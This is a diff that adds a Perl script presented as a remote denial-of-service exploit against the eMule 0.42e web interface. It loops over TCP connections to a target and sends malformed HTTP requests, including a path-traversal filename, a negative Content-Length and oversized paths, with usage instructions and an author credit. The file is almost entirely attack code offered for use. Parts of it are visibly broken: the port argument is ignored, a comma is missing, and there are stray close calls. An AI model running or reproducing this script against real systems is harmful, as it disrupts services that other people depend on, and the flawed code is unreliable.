@@ -1,0 +1,106 @@
+#!/usr/bin/perl
+
+system("cls");
+# Emule 0.42e Remote Denial Of Service Exploit
+# Coded by Rafel Ivgi, The-Insider
+# usage: perl emule042e.pl <host> <port> <how many times>
+
+use IO::Socket;
+my $host = $ARGV[0];
+my $port = $ARGV[1];
+my $times = $ARGV[2];
+
+if ($host)
+{
+unless($port) { $port="4711";}
+unless($times) { $times="50";}
+{
+                print "Emule 0.42e Remote Denial Of Service Exploit
+           Coded by The-Insider\n\n";
+                print "[+] Connecting to target $host:$port\n";
+for $i (1..$times) {
+                $remote=IO::Socket::INET->new(Proto =>"tcp",
+  PeerAddr => $host,
+  PeerPort =>  80,
+                                    Type => SOCK_STREAM
+                                    Timeout => 8);
+
+ unless ($remote)
+                  {
+                  die "can't connect to $host"
+                  }
+                  print "[+] Connected to target $host:$port\n";
+                  print "[+] Sending Request\n";
+ $remote ->autoflush(1);
+print $remote "GET / HTTP/1.1
+Content-Disposition: form-data; name=\"file\";
+filename=\"../../../file.txt\"
+
+";
+print $remote "POST / HTTP/1.0
+Content-Length: 10
+
+123456789
+
+";
+print $remote "POST / HTTP/1.1
+Content-Length: -1
+
+";
+print $remote "GET /%%%%%%%%%%%% HTTP/1.0
+
+";
+print $remote "index.htm
+
+";
+print $remote "GET
+/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaa HTTP/1.1
+
+";
+print $remote "GET
+/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaa
+
+";
+print $remote "GET c:
+";
+                  print $remote "GET
+/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa HTTP/1.1
+
+";
+                  while(<$remote>)
+                  {
+                  $cool .= $_;
+ if ($cool =~ /Server:/i)
+                  {
+                  close $cool;
+                 -close $remote;
+                  }
+                  }
+                  print "[+] Target Demolished.\n";
+}}}
+else
+{
+die "\nEmule 0.42e Remote Denial Of Service Exploit
+Coded by Rafel Ivgi, The-Insider:   http://theinsider.deep-ice.com
+
+
+usage: perl emule042e.pl <host> <port> <how many times>\n\n";
+}
